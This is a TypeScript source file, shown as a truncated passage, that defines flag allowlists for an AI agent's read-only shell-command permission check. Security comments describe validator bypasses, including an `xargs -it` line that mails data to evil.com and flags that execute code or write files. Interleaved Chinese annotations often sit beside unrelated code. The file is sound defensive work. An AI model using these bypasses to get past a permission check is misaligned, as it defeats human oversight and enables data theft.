import type { z } from 'zod/v4'
import { getOriginalCwd } from '../../bootstrap/state.js'
import {
  extractOutputRedirections,
  splitCommand_DEPRECATED,
} from '../../utils/bash/commands.js'
import { tryParseShellCommand } from '../../utils/bash/shellQuote.js'
import { getCwd } from '../../utils/cwd.js'
import { isCurrentDirectoryBareGitRepo } from '../../utils/git.js'
import type { PermissionResult } from '../../utils/permissions/PermissionResult.js'
import { getPlatform } from '../../utils/platform.js'
import { SandboxManager } from '../../utils/sandbox/sandbox-adapter.js'
import {
  containsVulnerableUncPath,
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  type FlagArgType,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  PYRIGHT_READ_ONLY_COMMANDS,
  RIPGREP_READ_ONLY_COMMANDS,
  validateFlags,
} from '../../utils/shell/readOnlyCommandValidation.js'
import type { BashTool } from './BashTool.js'
import { isNormalizedGitCommand } from './bashPermissions.js'
import { bashCommandIsSafe_DEPRECATED } from './bashSecurity.js'
import {
  COMMAND_OPERATION_TYPE,
  PATH_EXTRACTORS,
  type PathCommand,
} from './pathValidation.js'
import { sedCommandIsAllowedByAllowlist } from './sedValidation.js'

// Unified command validation configuration system
// 本文件是「只读判定」的两条腿之一：上面的 COMMAND_ALLOWLIST 逐命令声明安全旗标（新机制），下面的 READONLY_COMMAND_REGEXES 是整命令正则（旧机制）。文件头注释明说优先用 allowlist——正则会被 GNU getopt_long 的缩写特性打穿（git --upload-pack=cmd 可缩写成 --up=cmd）。
type CommandConfig = {
// 一条命令的只读档案四件套：safeFlags 是旗标白名单；regex 做旗标之外的正交校验；callback 做旗标解析搞不定的语义检查；respectsDoubleDash 决定 `--` 之后还查不查旗标。
  // A Record mapping from the command (e.g. `xargs` or `git diff`) to its safe flags and the values they accept
  safeFlags: Record<string, FlagArgType>
  // An optional regex that is used for additional validation beyond flag parsing
  regex?: RegExp
  // An optional callback for additional custom validation logic. Returns true if the command is dangerous,
  // false if it appears to be safe. Meant to be used in conjunction with the safeFlags-based validation.
  additionalCommandIsDangerousCallback?: (
    rawCommand: string,
    args: string[],
  ) => boolean
  // When false, the tool does NOT respect POSIX `--` end-of-options.
  // validateFlags will continue checking flags after `--` instead of breaking.
  // Default: true (most tools respect `--`).
// 大多数工具认 POSIX `--`（选项结束符），所以 validateFlags 在 `--` 后应该停。base64 在 macOS 上不认——见下面 base64 条目里的 respectsDoubleDash: false。
  respectsDoubleDash?: boolean
}

// Shared safe flags for fd and fdfind (Debian/Ubuntu package name)
// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded —
// they execute arbitrary commands for each search result.
// fd/fdfind（Debian 系包名）共用同一份旗标表。-x/--exec 与 -X/--exec-batch 故意不收：按搜索结果执行任意命令。
const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
  '-h': 'none',
  '--help': 'none',
  '-V': 'none',
  '--version': 'none',
  '-H': 'none',
  '--hidden': 'none',
  '-I': 'none',
  '--no-ignore': 'none',
  '--no-ignore-vcs': 'none',
  '--no-ignore-parent': 'none',
  '-s': 'none',
  '--case-sensitive': 'none',
  '-i': 'none',
  '--ignore-case': 'none',
  '-g': 'none',
  '--glob': 'none',
  '--regex': 'none',
  '-F': 'none',
  '--fixed-strings': 'none',
  '-a': 'none',
  '--absolute-path': 'none',
  // SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same
  // pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
// -l/--list-details 也不收——它内部起 `ls` 子进程，PATH 里放个恶意 ls 就接管了。**一个旗标「只是显示信息」不代表安全，得看它内部还调了什么。**
  '-L': 'none',
  '--follow': 'none',
  '-p': 'none',
  '--full-path': 'none',
  '-0': 'none',
  '--print0': 'none',
  '-d': 'number',
  '--max-depth': 'number',
  '--min-depth': 'number',
  '--exact-depth': 'number',
  '-t': 'string',
  '--type': 'string',
  '-e': 'string',
  '--extension': 'string',
  '-S': 'string',
  '--size': 'string',
  '--changed-within': 'string',
  '--changed-before': 'string',
  '-o': 'string',
  '--owner': 'string',
  '-E': 'string',
  '--exclude': 'string',
  '--ignore-file': 'string',
  '-c': 'string',
  '--color': 'string',
  '-j': 'number',
  '--threads': 'number',
  '--max-buffer-time': 'string',
  '--max-results': 'number',
  '-1': 'none',
  '-q': 'none',
  '--quiet': 'none',
  '--show-errors': 'none',
  '--strip-cwd-prefix': 'none',
  '--one-file-system': 'none',
  '--prune': 'none',
  '--search-path': 'string',
  '--base-directory': 'string',
  '--path-separator': 'string',
  '--batch-size': 'number',
  '--no-require-git': 'none',
  '--hyperlink': 'string',
  '--and': 'string',
  '--format': 'string',
}

// Central configuration for allowlist-based command validation
// All commands and flags here should only allow reading files. They should not
// allow writing to files, executing code, or creating network requests.
// 总原则：这里出现的每条命令、每个旗标，只许读文件。不许写文件、不许执行代码、不许发网络请求。
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: {
// allowlist 匹配先长后短：多词命令（git stash list）优先于单词（git）。匹配上就把前缀长度记下来，后面旗标从 commandTokens 起查。
      '-I': '{}',
// -i 和 -e 被删是 vulnerability archaeology 的标本。两个都是 GNU getopt 可选附加参数（`i::`/`e::`）：附加写时语义一致，空格分写时校验器和 xargs 理解相反——`xargs -it tail a@evil.com` 校验器看 -it 是俩 none，GNU 却把 t 当 replace-str，tail 才是目标命令，于是 /usr/sbin/sendmail 被拼出来发信。改用大写 -I {} / -E EOF（强制参数），两边对「吃几个参数」的认知一致。
      // SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
      // optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
      // attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
      // flag takes NO arg and `X` becomes the next positional (target command).
      //
      // `-i` (`i::` — optional replace-str):
      //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
      //
      // `-e` (`e::` — optional eof-str):
      //   cat data | xargs -e EOF echo foo
      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
      //   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
      //   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
      //
      // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
      // arg) instead — both validator and xargs agree on argument consumption.
      // `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
      '-n': 'number',
      '-P': 'number',
      '-L': 'number',
      '-s': 'number',
      '-E': 'EOF', // POSIX, MANDATORY separate arg — validator & xargs agree
      '-0': 'none',
      '-t': 'none',
      '-r': 'none',
      '-x': 'none',
      '-d': 'char',
    },
  },
  // All git read-only commands from shared validation map
// git 的只读子命令从共享验证表铺进来，具体旗标在 utils/shell/readOnlyCommandValidation。
  ...GIT_READ_ONLY_COMMANDS,
  file: {
    safeFlags: {
      // Output format flags
      '--brief': 'none',
      '-b': 'none',
      '--mime': 'none',
      '-i': 'none',
      '--mime-type': 'none',
      '--mime-encoding': 'none',
      '--apple': 'none',
      // Behavior flags
      '--check-encoding': 'none',
      '-c': 'none',
      '--exclude': 'string',
      '--exclude-quiet': 'string',
      '--print0': 'none',
      '-0': 'none',
      '-f': 'string',
      '-F': 'string',
      '--separator': 'string',
      '--help': 'none',
      '--version': 'none',
      '-v': 'none',
      // Following/dereferencing
      '--no-dereference': 'none',
      '-h': 'none',
      '--dereference': 'none',
      '-L': 'none',
      // Magic file options (safe when just reading)
      '--magic-file': 'string',
// cd 特殊：所有参数拼成一条路径（cd 只接一个目录参数）。
      '-m': 'string',
      // Other safe options
      '--keep-going': 'none',
      '-k': 'none',
      '--list': 'none',
      '-l': 'none',
      '--no-buffer': 'none',
      '-n': 'none',
      '--preserve-date': 'none',
      '-p': 'none',
// find 的 `--` 支持让「-/../../etc」这种以 - 开头的路径也能当搜索起点。这里选择过度收集：`--` 后连谓词也当路径收，宁可误报（find 是只读，谓词解出的路径都在 cwd 内，合法用户不会被挡），不可漏报。
      '--raw': 'none',
      '-r': 'none',
      '-s': 'none',
      '--special-files': 'none',
      // Uncompress flag for archives
      '--uncompress': 'none',
      '-z': 'none',
    },
  },
  sed: {
    safeFlags: {
      // Expression flags
      '--expression': 'string',
      '-e': 'string',
      // Output control
      '--quiet': 'none',
      '--silent': 'none',
      '-n': 'none',
      // Extended regex
      '--regexp-extended': 'none',
      '-r': 'none',
      '--posix': 'none',
      '-E': 'none',
      // Line handling
      '--line-length': 'number',
      '-l': 'number',
      '--zero-terminated': 'none',
      '-z': 'none',
      '--separate': 'none',
      '-s': 'none',
      '--unbuffered': 'none',
      '-u': 'none',
      // Debugging/help
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    additionalCommandIsDangerousCallback: (
      rawCommand: string,
      _args: string[],
    ) => !sedCommandIsAllowedByAllowlist(rawCommand),
  },
  sort: {
    safeFlags: {
      // Sorting options
      '--ignore-leading-blanks': 'none',
      '-b': 'none',
      '--dictionary-order': 'none',
      '-d': 'none',
      '--ignore-case': 'none',
      '-f': 'none',
      '--general-numeric-sort': 'none',
      '-g': 'none',
      '--human-numeric-sort': 'none',
      '-h': 'none',
      '--ignore-nonprinting': 'none',
      '-i': 'none',
      '--month-sort': 'none',
      '-M': 'none',
      '--numeric-sort': 'none',
      '-n': 'none',
      '--random-sort': 'none',
      '-R': 'none',
      '--reverse': 'none',
      '-r': 'none',
      '--sort': 'string',
      '--stable': 'none',
      '-s': 'none',
      '--unique': 'none',
      '-u': 'none',
      '--version-sort': 'none',
      '-V': 'none',
      '--zero-terminated': 'none',
      '-z': 'none',
      // Key specifications
      '--key': 'string',
      '-k': 'string',
      '--field-separator': 'string',
      '-t': 'string',
      // Checking
      '--check': 'none',
      '-c': 'none',
      '--check-char-order': 'none',
      '-C': 'none',
      // Merging
      '--merge': 'none',
      '-m': 'none',
      // Buffer size
      '--buffer-size': 'string',
      '-S': 'string',
      // Parallel processing
      '--parallel': 'number',
      // Batch size
      '--batch-size': 'number',
      // Help and version
      '--help': 'none',
// tr 前两个非旗标参数是字符集不是路径，按 SET1/SET2 切掉。
      '--version': 'none',
    },
  },
  man: {
    safeFlags: {
      // Safe display options
      '-a': 'none', // Display all manual pages
      '--all': 'none', // Same as -a
      '-d': 'none', // Debug mode
      '-f': 'none', // Emulate whatis
      '--whatis': 'none', // Same as -f
      '-h': 'none', // Help
      '-k': 'none', // Emulate apropos
      '--apropos': 'none', // Same as -k
      '-l': 'string', // Local file (safe for reading, Linux only)
      '-w': 'none', // Display location instead of content

      // Safe formatting options
      '-S': 'string', // Restrict manual sections
      '-s': 'string', // Same as -S for whatis/apropos mode
    },
  },
  // help command - only allow bash builtin help flags to prevent attacks when
  // help is aliased to man (e.g., in oh-my-zsh common-aliases plugin).
  // man's -P flag allows arbitrary command execution via pager.
  help: {
    safeFlags: {
      '-d': 'none', // Output short description for each topic
      '-m': 'none', // Display usage in pseudo-manpage format
      '-s': 'none', // Output only a short usage synopsis
    },
  },
  netstat: {
    safeFlags: {
      // Safe display options
      '-a': 'none', // Show all sockets
      '-L': 'none', // Show listen queue sizes
      '-l': 'none', // Print full IPv6 address
      '-n': 'none', // Show network addresses as numbers

      // Safe filtering options
      '-f': 'string', // Address family (inet, inet6, unix, vsock)

      // Safe interface options
      '-g': 'none', // Show multicast group membership
      '-i': 'none', // Show interface state
      '-I': 'string', // Specific interface

      // Safe statistics options
      '-s': 'none', // Show per-protocol statistics

      // Safe routing options
      '-r': 'none', // Show routing tables

      // Safe mbuf options
      '-m': 'none', // Show memory management statistics

      // Safe other options
      '-v': 'none', // Increase verbosity
    },
  },
  ps: {
    safeFlags: {
      // UNIX-style process selection (these are safe)
      '-e': 'none', // Select all processes
      '-A': 'none', // Select all processes (same as -e)
      '-a': 'none', // Select all with tty except session leaders
      '-d': 'none', // Select all except session leaders
      '-N': 'none', // Negate selection
      '--deselect': 'none',

// sed 路径提取：-f 的脚本文件本身要校验（脚本文件也是输入），-e 的表达式不碰文件；第一个非旗标是脚本，之后才是文件。
      // UNIX-style output format (safe, doesn't show env)
      '-f': 'none', // Full format
      '-F': 'none', // Extra full format
      '-l': 'none', // Long format
      '-j': 'none', // Jobs format
      '-y': 'none', // Don't show flags

      // Output modifiers (safe ones)
      '-w': 'none', // Wide output
      '-ww': 'none', // Unlimited width
      '--width': 'number',
      '-c': 'none', // Show scheduler info
      '-H': 'none', // Show process hierarchy
      '--forest': 'none',
      '--headers': 'none',
      '--no-headers': 'none',
      '-n': 'string', // Set namelist file
      '--sort': 'string',

      // Thread display
      '-L': 'none', // Show threads
      '-T': 'none', // Show threads
      '-m': 'none', // Show threads after processes

      // Process selection by criteria
      '-C': 'string', // By command name
      '-G': 'string', // By real group ID
      '-g': 'string', // By session or effective group
      '-p': 'string', // By PID
      '--pid': 'string',
      '-q': 'string', // Quick mode by PID
      '--quick-pid': 'string',
      '-s': 'string', // By session ID
      '--sid': 'string',
      '-t': 'string', // By tty
      '--tty': 'string',
      '-U': 'string', // By real user ID
      '-u': 'string', // By effective user ID
      '--user': 'string',

      // Help/version
      '--help': 'none',
      '--info': 'none',
      '-V': 'none',
      '--version': 'none',
    },
    // Block BSD-style 'e' modifier which shows environment variables
    // BSD options are letter-only tokens without a leading dash
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // Check for BSD-style 'e' in letter-only tokens (not -e which is UNIX-style)
      // A BSD-style option is a token of only letters (no leading dash) containing 'e'
      return args.some(
        a => !a.startsWith('-') && /^[a-zA-Z]*e[a-zA-Z]*$/.test(a),
      )
    },
  },
// jq 与 grep 同构：第一个非旗标是 filter，之后全是文件；没给文件就从 stdin 读，无路径可校验。
  base64: {
    respectsDoubleDash: false, // macOS base64 does not respect POSIX --
    safeFlags: {
      // Safe decode options
      '-d': 'none', // Decode
      '-D': 'none', // Decode (macOS)
      '--decode': 'none', // Decode

      // Safe formatting options
      '-b': 'number', // Break lines at num (macOS)
      '--break': 'number', // Break lines at num (macOS)
      '-w': 'number', // Wrap lines at COLS (Linux)
      '--wrap': 'number', // Wrap lines at COLS (Linux)

      // Safe input options (read from file, not write)
      '-i': 'string', // Input file (safe for reading)
      '--input': 'string', // Input file (safe for reading)

      // Safe misc options
      '--ignore-garbage': 'none', // Ignore non-alphabet chars when decoding (Linux)
      '-h': 'none', // Help
      '--help': 'none', // Help
      '--version': 'none', // Version
    },
  },
  grep: {
    safeFlags: {
      // Pattern flags
      '-e': 'string', // Pattern
      '--regexp': 'string',
      '-f': 'string', // File with patterns
      '--file': 'string',
      '-F': 'none', // Fixed strings
      '--fixed-strings': 'none',
      '-G': 'none', // Basic regexp (default)
      '--basic-regexp': 'none',
      '-E': 'none', // Extended regexp
      '--extended-regexp': 'none',
      '-P': 'none', // Perl regexp
      '--perl-regexp': 'none',

      // Matching control
      '-i': 'none', // Ignore case
      '--ignore-case': 'none',
      '--no-ignore-case': 'none',
      '-v': 'none', // Invert match
      '--invert-match': 'none',
      '-w': 'none', // Word regexp
      '--word-regexp': 'none',
      '-x': 'none', // Line regexp
      '--line-regexp': 'none',

      // Output control
      '-c': 'none', // Count
      '--count': 'none',
      '--color': 'string',
      '--colour': 'string',
      '-L': 'none', // Files without match
      '--files-without-match': 'none',
      '-l': 'none', // Files with matches
// git 只有 diff --no-index 需要路径校验——它显式比较仓库外的任意两个文件。其余 git 子命令在仓库上下文里活动，git 自己的安全模型已约束，不重复校验。
      '--files-with-matches': 'none',
      '-m': 'number', // Max count
      '--max-count': 'number',
      '-o': 'none', // Only matching
      '--only-matching': 'none',
      '-q': 'none', // Quiet
      '--quiet': 'none',
      '--silent': 'none',
      '-s': 'none', // No messages
      '--no-messages': 'none',

      // Output line prefix
      '-b': 'none', // Byte offset
      '--byte-offset': 'none',
      '-H': 'none', // With filename
      '--with-filename': 'none',
      '-h': 'none', // No filename
      '--no-filename': 'none',
      '--label': 'string',
      '-n': 'none', // Line number
      '--line-number': 'none',
// PATH_EXTRACTORS 的键即「哪些命令要查路径」的名单，validateSinglePathCommand 拿它做第一道门。
      '-T': 'none', // Initial tab
      '--initial-tab': 'none',
      '-u': 'none', // Unix byte offsets
      '--unix-byte-offsets': 'none',
      '-Z': 'none', // Null after filename
      '--null': 'none',
      '-z': 'none', // Null data
      '--null-data': 'none',

      // Context control
      '-A': 'number', // After context
      '--after-context': 'number',
      '-B': 'number', // Before context
      '--before-context': 'number',
      '-C': 'number', // Context
      '--context': 'number',
      '--group-separator': 'string',
      '--no-group-separator': 'none',

      // File and directory selection
      '-a': 'none', // Text (process binary as text)
      '--text': 'none',
      '--binary-files': 'string',
      '-D': 'string', // Devices
      '--devices': 'string',
      '-d': 'string', // Directories
      '--directories': 'string',
      '--exclude': 'string',
      '--exclude-from': 'string',
      '--exclude-dir': 'string',
      '--include': 'string',
      '-r': 'none', // Recursive
      '--recursive': 'none',
      '-R': 'none', // Dereference-recursive
      '--dereference-recursive': 'none',

      // Other options
      '--line-buffered': 'none',
      '-U': 'none', // Binary
      '--binary': 'none',

// 操作类型表决定路径按读还是按写校验：rm/mv/cp/sed 是写，cat/ls/grep 是读，mkdir/touch 是创建。**注意 sed 默认算写**——见后面 createPathChecker 的只读 sed 特判。
      // Help and version
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },
  ...RIPGREP_READ_ONLY_COMMANDS,
  // Checksum commands - these only read files and compute/verify hashes
  // All flags are safe as they only affect output format or verification behavior
  sha256sum: {
    safeFlags: {
      // Mode flags
      '-b': 'none', // Binary mode
      '--binary': 'none',
      '-t': 'none', // Text mode
      '--text': 'none',

      // Check/verify flags
      '-c': 'none', // Verify checksums from file
      '--check': 'none',
      '--ignore-missing': 'none', // Ignore missing files during check
      '--quiet': 'none', // Quiet mode during check
      '--status': 'none', // Don't output, exit code shows success
      '--strict': 'none', // Exit non-zero for improperly formatted lines
      '-w': 'none', // Warn about improperly formatted lines
      '--warn': 'none',

      // Output format flags
      '--tag': 'none', // BSD-style output
      '-z': 'none', // End output lines with NUL
      '--zero': 'none',

      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  sha1sum: {
    safeFlags: {
      // Mode flags
      '-b': 'none', // Binary mode
      '--binary': 'none',
      '-t': 'none', // Text mode
      '--text': 'none',
// mv/cp 一刀切禁所有旗标：--target-directory=PATH 这类旗标会让「提取出来的路径」与「真正写入的路径」不是同一个，所以宁可全部转人工。

      // Check/verify flags
      '-c': 'none', // Verify checksums from file
      '--check': 'none',
      '--ignore-missing': 'none', // Ignore missing files during check
      '--quiet': 'none', // Quiet mode during check
      '--status': 'none', // Don't output, exit code shows success
      '--strict': 'none', // Exit non-zero for improperly formatted lines
      '-w': 'none', // Warn about improperly formatted lines
      '--warn': 'none',

      // Output format flags
      '--tag': 'none', // BSD-style output
      '-z': 'none', // End output lines with NUL
      '--zero': 'none',

      // Help and version
      '--help': 'none',
      '--version': 'none',
// COMMAND_VALIDATOR 在路径提取之前跑。旗标本身就能绕过节流，就别指望后面的路径提取补锅。
    },
  },
  md5sum: {
    safeFlags: {
      // Mode flags
      '-b': 'none', // Binary mode
      '--binary': 'none',
      '-t': 'none', // Text mode
      '--text': 'none',

      // Check/verify flags
      '-c': 'none', // Verify checksums from file
      '--check': 'none',
      '--ignore-missing': 'none', // Ignore missing files during check
      '--quiet': 'none', // Quiet mode during check
// 复合命令含 cd 时一切写操作转人工。原因是路径都相对原 cwd 解析，cd 之后的写落在哪无法静态确定。注释里的 ALTERNATIVE 方案（跟踪链上有效 cwd）更宽松但难处理 cd ~ / cd - / 连续 cd / cd 失败，暂不实施。
      '--status': 'none', // Don't output, exit code shows success
      '--strict': 'none', // Exit non-zero for improperly formatted lines
      '-w': 'none', // Warn about improperly formatted lines
      '--warn': 'none',

      // Output format flags
      '--tag': 'none', // BSD-style output
      '-z': 'none', // End output lines with NUL
      '--zero': 'none',

      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  // tree command - moved from READONLY_COMMAND_REGEXES to allow flags and path arguments
  // -o/--output writes to a file, so it's excluded. All other flags are display/filter options.
  tree: {
    safeFlags: {
      // Listing options
      '-a': 'none', // All files
      '-d': 'none', // Directories only
      '-l': 'none', // Follow symlinks
      '-f': 'none', // Full path prefix
      '-x': 'none', // Stay on current filesystem
      '-L': 'number', // Max depth
      // SECURITY: -R REMOVED. tree -R combined with -H (HTML mode) and -L (depth)
      // WRITES 00Tree.html files to every subdirectory at the depth boundary.
      // From man tree (< 2.1.0): "-R — at each of them execute tree again
      // adding `-o 00Tree.html` as a new option." The comment "Rerun at max
      // depth" was misleading — the "rerun" includes a hardcoded -o file write.
      // `tree -R -H . -L 2 /path` → writes /path/<subdir>/00Tree.html for each
      // subdir at depth 2. FILE WRITE, zero permissions.
// validatePath 返回三态：allowed / deny（命中显式 deny 规则，硬拒）/ ask。
      '-P': 'string', // Include pattern
      '-I': 'string', // Exclude pattern
      '--gitignore': 'none',
      '--gitfile': 'string',
      '--ignore-case': 'none',
      '--matchdirs': 'none',
      '--metafirst': 'none',
      '--prune': 'none',
// 自定义消息优先：安全检查（type other/safetyCheck）给的原因比通用模板更具体，直接透出。
      '--info': 'none',
      '--infofile': 'string',
      '--noreport': 'none',
      '--charset': 'string',
      '--filelimit': 'number',
      // File display options
      '-q': 'none', // Non-printable as ?
      '-N': 'none', // Non-printable as-is
// deny 与 ask 的分界：命中用户 deny 规则 → deny（无商量）；越出工作目录 → ask（可加目录放行）。
      '-Q': 'none', // Quote filenames
      '-p': 'none', // Protections
      '-u': 'none', // Owner
      '-g': 'none', // Group
      '-s': 'none', // Size bytes
      '-h': 'none', // Human-readable sizes
      '--si': 'none',
      '--du': 'none',
      '-D': 'none', // Last modification time
      '--timefmt': 'string',
      '-F': 'none', // Append indicator
      '--inodes': 'none',
      '--device': 'none',
      // Sorting options
      '-v': 'none', // Version sort
      '-t': 'none', // Sort by mtime
      '-c': 'none', // Sort by ctime
      '-U': 'none', // Unsorted
      '-r': 'none', // Reverse sort
      '--dirsfirst': 'none',
      '--filesfirst': 'none',
      '--sort': 'string',
      // Graphics/output options
      '-i': 'none', // No indentation lines
// createPathChecker 是路径校验器的工厂。顺序有讲究：先跑普通校验（含显式 deny）→ deny 就直接返回 → rm/rmdir 再查危险路径（不给建议，不鼓励保存）→ passthrough 直接过 → ask 才附建议。
      '-A': 'none', // ANSI line graphics
      '-S': 'none', // CP437 line graphics
      '-n': 'none', // No color
      '-C': 'none', // Color
      '-X': 'none', // XML output
      '-J': 'none', // JSON output
      '-H': 'string', // HTML output with base HREF
      '--nolinks': 'none',
      '--hintro': 'string',
      '--houtro': 'string',
      '-T': 'string', // HTML title
      '--hyperlink': 'none',
      '--scheme': 'string',
      '--authority': 'string',
      // Input options (read from file, not write)
      '--fromfile': 'none',
      '--fromtabfile': 'none',
      '--fflinks': 'none',
      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  // date command - moved from READONLY_COMMANDS because -s/--set can set system time
  // Also -f/--file can be used to read dates from file and set time
  // We only allow safe display options
// 危险删除路径放在「显式 deny 之后、其他结果之前」：用户写了 allowlist 也要问，但用户明确 deny 的尊重到底。
  date: {
    safeFlags: {
      // Display options (safe - don't modify system time)
      '-d': 'string', // --date=STRING - display time described by STRING
      '--date': 'string',
      '-r': 'string', // --reference=FILE - display file's modification time
      '--reference': 'string',
      '-u': 'none', // --utc - use UTC
      '--utc': 'none',
      '--universal': 'none',
      // Output format options
      '-I': 'none', // --iso-8601 (can have optional argument, but none type handles bare flag)
      '--iso-8601': 'string',
      '-R': 'none', // --rfc-email
      '--rfc-email': 'none',
      '--rfc-3339': 'string',
      // Debug/help
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
// 建议按操作类型分化：读操作建议加 Read 规则（目录存在才建议），写操作建议加目录，写/建另附「开启 acceptEdits 模式」。
    // Dangerous flags NOT included (blocked by omission):
    // -s / --set - sets system time
    // -f / --file - reads dates from file (can be used to set time in batch)
    // CRITICAL: date positional args in format MMDDhhmm[[CC]YY][.ss] set system time
    // Use callback to verify positional args start with + (format strings like +"%Y-%m-%d")
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // args are already parsed tokens after "date"
      // Flags that require an argument
      const flagsWithArgs = new Set([
        '-d',
        '--date',
        '-r',
        '--reference',
        '--iso-8601',
        '--rfc-3339',
      ])
      let i = 0
      while (i < args.length) {
        const token = args[i]!
        // Skip flags and their arguments
        if (token.startsWith('--') && token.includes('=')) {
          // Long flag with =value, already consumed
          i++
        } else if (token.startsWith('-')) {
          // Flag - check if it takes an argument
          if (flagsWithArgs.has(token)) {
            i += 2 // Skip flag and its argument
          } else {
            i++ // Just skip the flag
          }
        } else {
          // Positional argument - must start with + for format strings
          // Anything else (like MMDDhhmm) could set system time
// shell-quote 会把 *.txt 解析成 glob 对象，路径校验需要字符串，这里统一拍平。解析失败返回空数组（上游 fail-closed 会兜）。
          if (!token.startsWith('+')) {
            return true // Dangerous
          }
          i++
        }
      }
      return false // Safe
    },
  },
  // hostname command - moved from READONLY_COMMANDS because positional args set hostname
  // Also -F/--file sets hostname from file, -b/--boot sets default hostname
  // We only allow safe display options and BLOCK any positional arguments
  hostname: {
    safeFlags: {
      // Display options only (safe)
      '-f': 'none', // --fqdn - display FQDN
      '--fqdn': 'none',
      '--long': 'none',
      '-s': 'none', // --short - display short name
      '--short': 'none',
      '-i': 'none', // --ip-address
      '--ip-address': 'none',
      '-I': 'none', // --all-ip-addresses
      '--all-ip-addresses': 'none',
      '-a': 'none', // --alias
      '--alias': 'none',
      '-d': 'none', // --domain
      '--domain': 'none',
      '-A': 'none', // --all-fqdns
      '--all-fqdns': 'none',
      '-v': 'none', // --verbose
      '--verbose': 'none',
      '-h': 'none', // --help
      '--help': 'none',
      '-V': 'none', // --version
      '--version': 'none',
    },
    // CRITICAL: Block any positional arguments - they set the hostname
    // Also block -F/--file, -b/--boot, -y/--yp/--nis (not in safeFlags = blocked)
    // Use regex to ensure no positional args after flags
    regex: /^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$/,
  },
  // info command - moved from READONLY_COMMANDS because -o/--output writes to files
  // Also --dribble writes keystrokes to file, --init-file loads custom config
  // We only allow safe display/navigation options
  info: {
    safeFlags: {
      // Navigation/display options (safe)
      '-f': 'string', // --file - specify manual file to read
      '--file': 'string',
      '-d': 'string', // --directory - search path
      '--directory': 'string',
      '-n': 'string', // --node - specify node
      '--node': 'string',
// 先剥壳再取基名。不剥的话 `timeout 10 rm -rf /` 的基名是 timeout，rm 从未进入校验视野。
      '-a': 'none', // --all
      '--all': 'none',
      '-k': 'string', // --apropos - search
      '--apropos': 'string',
      '-w': 'none', // --where - show location
      '--where': 'none',
      '--location': 'none',
      '--show-options': 'none',
      '--vi-keys': 'none',
      '--subnodes': 'none',
      '-h': 'none',
      '--help': 'none',
      '--usage': 'none',
      '--version': 'none',
    },
    // Dangerous flags NOT included (blocked by omission):
    // -o / --output - writes output to file
    // --dribble - records keystrokes to file
    // --init-file - loads custom config (potential code execution)
    // --restore - replays keystrokes from file
  },

  lsof: {
    safeFlags: {
      '-?': 'none',
// sed 按 COMMAND_OPERATION_TYPE 默认是写；纯读的 sed（sed -n '1,10p'）把操作类型覆盖成 read，读别处的文件不再被当写拦截。
      '-h': 'none',
      '-v': 'none',
      '-a': 'none',
      '-b': 'none',
      '-C': 'none',
      '-l': 'none',
      '-n': 'none',
      '-N': 'none',
      '-O': 'none',
      '-P': 'none',
      '-Q': 'none',
      '-R': 'none',
      '-t': 'none',
      '-U': 'none',
      '-V': 'none',
      '-X': 'none',
      '-H': 'none',
// 这是 AST 版：直接用树解析好的 argv，不再过 shell-quote。动机是 shell-quote 有个单引号反斜杠 bug——解析成功但把重定向运算符搅成乱码 token，fail-closed 守卫不触发，路径校验被静默跳过。
      '-E': 'none',
      '-F': 'none',
      '-g': 'none',
      '-i': 'none',
      '-K': 'none',
      '-L': 'none',
      '-o': 'none',
      '-r': 'none',
      '-s': 'none',
      '-S': 'none',
      '-T': 'none',
      '-x': 'none',
      '-A': 'string',
      '-c': 'string',
      '-d': 'string',
      '-e': 'string',
      '-k': 'string',
      '-p': 'string',
      '-u': 'string',
      // OMITTED (writes to disk): -D (device cache file build/update)
    },
    // Block +m (create mount supplement file) — writes to disk.
    // +prefix flags are treated as positional args by validateFlags,
    // so we must catch them here. lsof accepts +m<path> (attached path, no space)
    // with both absolute (+m/tmp/evil) and relative (+mfoo, +m.evil) paths.
    additionalCommandIsDangerousCallback: (_rawCommand, args) =>
// argv 已剥过壳但 .text 是原始 span（含 `timeout 5 ` 前缀），所以 sed 白名单检查前再剥一次。
      args.some(a => a === '+m' || a.startsWith('+m')),
  },

  pgrep: {
    safeFlags: {
      '-d': 'string',
      '--delimiter': 'string',
      '-l': 'none',
      '--list-name': 'none',
      '-a': 'none',
      '--list-full': 'none',
      '-v': 'none',
      '--inverse': 'none',
      '-w': 'none',
      '--lightweight': 'none',
      '-c': 'none',
// 输出重定向（> / >>）单独一道校验：目标按 create 操作查。
      '--count': 'none',
      '-f': 'none',
      '--full': 'none',
      '-g': 'string',
      '--pgroup': 'string',
      '-G': 'string',
// cd + 重定向同样转人工：`cd .claude/ && echo x > settings.json` 的重定向目标相对原 cwd 校验，实际写在 cd 之后的目录。
      '--group': 'string',
      '-i': 'none',
      '--ignore-case': 'none',
      '-n': 'none',
      '--newest': 'none',
      '-o': 'none',
      '--oldest': 'none',
      '-O': 'string',
